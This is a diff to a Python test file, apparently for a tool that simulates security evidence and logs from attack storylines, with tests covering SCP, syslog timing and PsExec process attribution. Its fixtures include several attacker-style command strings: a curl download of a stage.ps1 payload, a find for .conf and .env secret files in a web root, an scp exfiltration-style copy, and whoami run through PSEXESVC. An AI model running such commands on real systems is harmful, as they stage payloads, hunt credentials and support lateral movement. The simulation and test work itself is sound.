@@ -3,10 +3,12 @@
 
 """Tests for network evidence inferred from storyline commands."""
 
-from datetime import UTC, datetime
+import random
+from datetime import UTC, datetime, timedelta
 from types import SimpleNamespace
 from typing import Any
 
+from evidenceforge.events.contexts import HostContext
 from evidenceforge.generation.engine.storyline import StorylineMixin
 from evidenceforge.models.scenario import System, User
 
@@ -42,6 +44,22 @@ class TestStorylineCommandNetworks:
         target = StorylineMixin._parse_http_url_target("http://[not-a-valid-host/path")
 
         assert target is None
+
+    def test_extract_output_file_ignores_find_or_operator(self):
+        output_file = StorylineMixin._extract_output_file(
+            "find /var/www/html -name *.conf -o -name *.env",
+            "linux",
+        )
+
+        assert output_file is None
+
+    def test_extract_output_file_accepts_short_o_for_output_tools(self):
+        output_file = StorylineMixin._extract_output_file(
+            "curl -s -o /tmp/stage.ps1 https://example.test/stage.ps1",
+            "linux",
+        )
+
+        assert output_file == "/tmp/stage.ps1"
 
     def test_extract_scp_target_from_remote_destination(self):
         target = StorylineMixin._extract_scp_target(
@@ -99,12 +117,27 @@ class _FakeActivityGenerator:
         self.explicit_credentials: list[dict] = []
         self.processes: list[dict] = []
         self.dhcp_leases: list[dict] = []
+        self.syslog_events: list[dict] = []
 
     def generate_bash_command(self, *args: Any, **kwargs: Any) -> None:
         return None
 
     def _resolve_parent(self, *args: Any, **kwargs: Any) -> int:
         return 1
+
+    def _get_system_pid(self, *args: Any, **kwargs: Any) -> int:
+        return 500
+
+    def _build_host_context(self, system: System) -> HostContext:
+        return HostContext(
+            hostname=system.hostname,
+            ip=system.ip,
+            os=system.os,
+            os_category="linux"
+            if "linux" in system.os.lower() or "ubuntu" in system.os.lower()
+            else "windows",
+            system_type=system.type,
+        )
 
     def generate_process(self, *args: Any, **kwargs: Any) -> int:
         self.processes.append(kwargs)
@@ -130,13 +163,28 @@ class _FakeActivityGenerator:
     def generate_dhcp_lease(self, **kwargs: Any) -> None:
         self.dhcp_leases.append(kwargs)
 
+    def generate_syslog_event(self, **kwargs: Any) -> None:
+        self.syslog_events.append(kwargs)
+
     def _expand_and_emit(self, *args: Any, **kwargs: Any) -> None:
         return None
 
 
 class _FakeStateManager:
+    def set_current_time(self, *args: Any, **kwargs: Any) -> None:
+        return None
+
     def get_sessions_for_user(self, username: str) -> list[SimpleNamespace]:
         return [SimpleNamespace(system="SRC", logon_id="0xabc")]
+
+    def get_processes_on_system(self, hostname: str) -> list[SimpleNamespace]:
+        return []
+
+    def create_process(self, *args: Any, **kwargs: Any) -> int:
+        return 6505
+
+    def get_process_object_id(self, hostname: str, pid: int) -> str:
+        return f"{hostname}:{pid}"
 
     def mark_story_process(self, hostname: str, pid: int) -> None:
         return None
@@ -192,6 +240,64 @@ class TestStorylineScpCorrelation:
         assert engine.activity_generator.reserved_ports == [45678]
         assert engine.activity_generator.connections[0]["src_port"] == 45678
         assert receiver_ports == [45678]
+
+    def test_scp_receiver_ssh_syslog_uses_distinct_submillisecond_suffixes(self):
+        source = System(
+            hostname="SRC",
+            ip="10.10.4.10",
+            os="Ubuntu 22.04",
+            type="workstation",
+        )
+        target = System(
+            hostname="DST",
+            ip="10.10.2.30",
+            os="Ubuntu 22.04",
+            type="server",
+        )
+        actor = User(
+            username="alice",
+            full_name="Alice Example",
+            email="alice@example.com",
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.state_manager = _FakeStateManager()
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.dispatcher = SimpleNamespace(dispatch=lambda event: None)
+        transfer_time = datetime(2024, 3, 18, 17, 15, 2, 638000, tzinfo=UTC)
+
+        engine._emit_scp_receiver_artifacts(
+            source_system=source,
+            target_system=target,
+            actor=actor,
+            source_pid=4242,
+            source_process="/usr/bin/scp",
+            source_command="scp /tmp/archive.tar.gz root@DST:/var/tmp/archive.tar.gz",
+            target_user="root",
+            target_path="/var/tmp/archive.tar.gz",
+            transfer_time=transfer_time,
+            source_port=40117,
+            rng=random.Random(7),
+        )
+
+        syslog_times = [event["time"] for event in engine.activity_generator.syslog_events]
+        assert len(syslog_times) == 3
+        assert syslog_times[0] < syslog_times[1] < syslog_times[2]
+        assert (
+            timedelta(milliseconds=80)
+            < syslog_times[0] - transfer_time
+            < timedelta(milliseconds=81)
+        )
+        assert (
+            timedelta(milliseconds=350)
+            < syslog_times[1] - transfer_time
+            < timedelta(milliseconds=351)
+        )
+        assert (
+            timedelta(milliseconds=900)
+            < syslog_times[2] - transfer_time
+            < timedelta(milliseconds=901)
+        )
+        assert len({timestamp.microsecond % 1000 for timestamp in syslog_times}) == 3
 
     def test_net_domain_queries_do_not_auto_emit_4648(self):
         source = System(
@@ -317,6 +423,57 @@ class TestStorylineScpCorrelation:
         assert conn["dst_ip"] == "45.33.32.30"
         assert conn["hostname"] == "cdn-assets-update.com"
         assert conn["preserve_dst_ip"] is True
+
+    def test_recent_psexesvc_service_runs_follow_on_commands_as_system(self):
+        source = System(
+            hostname="DC-01",
+            ip="10.10.0.10",
+            os="Windows Server 2022",
+            type="domain_controller",
+        )
+        actor = User(
+            username="alice",
+            full_name="Alice Example",
+            email="alice@example.com",
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.scenario = SimpleNamespace(
+            environment=SimpleNamespace(systems=[source], service_accounts=[])
+        )
+        engine.state_manager = _FakeStateManager()
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.dispatcher = SimpleNamespace(visibility_engine=None)
+        service_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
+        engine._record_storyline_service_install(
+            system=source,
+            service_name="PSEXESVC",
+            service_file_name=r"%SystemRoot%\PSEXESVC.exe",
+            service_account="LocalSystem",
+            time=service_time,
+        )
+        spec = SimpleNamespace(
+            type="process",
+            process_name=r"C:\Windows\System32\cmd.exe",
+            command_line="cmd.exe /c whoami /all",
+        )
+
+        engine._execute_typed_event(
+            spec=spec,
+            actor=actor,
+            system=source,
+            time=service_time.replace(second=2),
+            activity="run remote command through psexec service",
+            explicit_types={"process"},
+        )
+
+        service_proc = engine.activity_generator.processes[0]
+        child_proc = engine.activity_generator.processes[1]
+        assert service_proc["user"].username == "SYSTEM"
+        assert service_proc["process_name"] == r"C:\Windows\PSEXESVC.exe"
+        assert service_proc["parent_pid"] == 500
+        assert child_proc["user"].username == "SYSTEM"
+        assert child_proc["logon_id"] == "0x3e7"
+        assert child_proc["parent_pid"] == 4242
 
     def test_storyline_dhcp_lease_reuses_existing_host_lease_identity(self):
         source = System(
